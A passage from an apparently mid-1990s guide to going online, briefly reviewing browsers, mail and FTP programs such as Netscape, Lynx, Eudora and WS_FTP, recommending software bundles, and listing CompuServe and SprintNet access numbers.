versions of other browsers are coming out which compete
with this shareware product feature-wise.  Can be found by
an anonymous FTP to ftp.mcom.com in the Netscape directory.

e. Plug 'n Play Mosaic.

There's those words again.  This package is in no way plug
and play in which it claims.  Comes with the NCSA Mosaic
WWW browser.

f. NetCruiser.

If you go with NETCOM as an access provider, this is the
software you will be sent.

g. Internaut.

If you go with PSINET as an access provider, this is the
software you will be sent.

h. Lynx.

TEXT-BASED shareware program for viewing the WWW.  Not as
neato and pretty as the graphical versions, like, for
example, Mosaic or Netscape.

i. Eudora.

Very popular shareware email program.

j. WS_FTP.

Very popular shareware FTP program.


I recommend the following software:

o Spry's Internet in a Box V2.0 -- great if you have the
  money to blow.  Will be well worth it.  Spry's Mosaic
  V2.0 WWW browser is now as good as Netscape.

o Trumpet WinSock, Netscape, Eudora, WS_FTP, and any other
  shareware internet program you can get your hands on.
  This approach, while harder to set up, is.. free.


And that brings this article to a close, almost.  Here are
some handy-dandy numbers:

800-848-8980, option 2 - CompuServe local access numbers.
(Some providers are using CompuServe's network of modem
installations for access to THEIR service... go figure)

800-877-5045, option 1,2 - SprintNet local access numbers.
(Some providers give SprintNet as an EXPENSIVE option, but
never tell you your correct local access number for it)
